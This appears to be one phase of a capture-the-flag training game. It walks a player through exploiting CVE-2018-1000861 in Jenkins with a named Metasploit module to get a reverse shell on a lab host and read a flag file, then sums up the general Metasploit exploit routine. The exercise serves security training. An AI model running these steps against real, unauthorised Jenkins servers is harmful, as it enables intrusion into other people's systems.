PHASE 3 -- OPERATIONS
════════════════════
tool:  msfconsole

You found the bug in phase 2: CVE-2018-1000861, unauth RCE in
Jenkins 2.121.1. Now we walk through it.

The blueprint we want is on the Jenkins host at:

    /var/m0use/blueprint.txt

Your job: use the metasploit module for this CVE to pop a shell on
the Jenkins box, read that file, and submit the flag.


YOUR WALK
─────────
We've preloaded the module and your callback address for this
engagement, so you only have to do the parts that matter -- point
at the target and fire. Five commands:

    1.  msfconsole
    2.  set RHOSTS 10.4.12.1
    3.  exploit
    4.  cat /var/m0use/blueprint.txt
    5.  exit

Step 1 enters metasploit. The prompt changes to:

    msf6 exploit(multi/http/jenkins_metaprogramming) >

Step 2 tells metasploit where the target is. Step 3 fires it --
metasploit runs a check first, then sends the payload, then opens
a reverse shell. The prompt goes blank: you're now typing as the
jenkins user on the Jenkins box.

Step 4 reads the blueprint. The flag is on the line that starts
with "Flag:" -- copy the value from inside m0use{...}.

Step 5 closes the session and leaves metasploit. You're back at
the m0usenet prompt. Type the flag value (no m0use{...} wrap, no
keyword, just the value) and hit Enter.


THE BIG PICTURE
───────────────
For context: the full metasploit pattern, for any CVE you'll ever
exploit with it, is:

    search        find the module by CVE id
    use           select it
    show options  see what params it needs
    set           fill in params (target, callback, etc.)
    check         confirm vulnerability before firing
    exploit       fire it; if it works, you get a shell

We did search/use/show/check for you. You did set + exploit. Same
muscles, fewer reps.

Stuck?  cat hint  -- no penalty.
